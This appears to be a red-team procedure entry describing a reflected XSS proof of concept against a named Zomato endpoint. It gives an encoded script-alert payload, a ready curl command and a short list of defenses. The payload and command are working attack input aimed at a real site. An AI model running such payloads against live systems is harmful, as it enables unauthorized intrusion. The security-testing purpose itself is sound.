---
id: proc-uuid-2
tags:
  - xss
  - payload-testing
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-test-xss-alert]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:47.295Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Test Reflected XSS with JavaScript Payload

## Summary

This procedure tests the reflected XSS vulnerability by injecting a JavaScript alert payload into the 'callback' parameter, confirming arbitrary code execution in the browser.

## Description

Targeting the Zomato endpoint, encode a <script>alert(document.domain)</script> payload and inject it via GET or POST. The lack of input validation allows the script to execute directly. This is useful in red teaming to validate XSS before escalation. Requires only public access; test in a browser for visual confirmation.

## Requirements

1. URL encoding knowledge for payloads
2. Browser for execution observation
3. Curl or similar for repeatable tests

## Defense

Defensive measures and detection strategies:

- Sanitize all user inputs with HTML entity encoding
- Use output escaping in JSON or script contexts
- Monitor for anomalous JavaScript in request logs

## Objectives

1. Inject and execute proof-of-concept XSS payload
2. Verify reflection without filtering
3. Assess execution context (e.g., domain alert)

## Instructions

### Step 1: Craft Payload

**Context**: URL-encode the script to bypass basic filters.

Payload: callback=%3Cscript%3Ealert(document.domain)%3C/script%3E

### Step 2: Send and Observe

**Context**: Deliver the payload via GET request and watch for execution.

Execute [[commands/curl-test-xss-alert]]:

```bash
curl "https://www.zomato.com/php/instagram_tag_relay?callback=%3Cscript%3Ealert(document.domain)%3C/script%3E" -v
```

> In a browser, visit the URL; an alert should pop up showing 'www.zomato.com'.

**Expected Output**: Alert dialog or console execution confirming JS run.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-test-xss-alert]]

## Tools Used


## Tags

- xss
- payload-testing
